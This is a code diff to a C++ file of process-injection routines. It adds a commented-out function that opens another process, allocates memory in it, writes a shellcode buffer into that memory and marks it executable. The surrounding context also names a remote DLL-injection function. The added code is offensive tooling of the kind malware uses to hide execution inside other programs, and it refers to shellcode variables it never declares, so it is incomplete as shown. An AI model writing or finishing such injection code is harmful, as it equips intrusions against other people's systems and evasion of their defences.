@@ -1,6 +1,6 @@
 #include "Injections.h"
 #include <iostream>
-#include <windows.h>
+#include "executil.h"
 #include <string.h>
 #include <fstream>
 #include <filesystem>
@@ -84,3 +84,44 @@ BOOL InjectDllRemote(DWORD processId, LPSTR cDllFilePath) {
 
     return TRUE;
 }
+
+//BOOL InjectToRemoteProcessNoExec(IN DWORD processId, LPSTR cDllFilePath, OUT PVOID* ppAddress) {
+//
+//    SIZE_T  sNumberOfBytesWritten = NULL;
+//    DWORD   dwOldProtection = NULL;
+//
+//    if (!processId || !cDllFilePath)
+//        return FALSE;
+//
+//    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+//        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+//        FALSE, processId);
+//    if (!hProcess) {
+//        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
+//        ShowLastErrorMessageVerbose();
+//        return FALSE;
+//    }
+//
+//    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+//    if (*ppAddress == NULL) {
+//        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+//        return FALSE;
+//    }
+//    printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
+//
+//
+//    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+//        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+//        return FALSE;
+//    }
+//
+//
+//    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+//        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+//        return FALSE;
+//    }
+//
+//
+//    return TRUE;
+//}
+
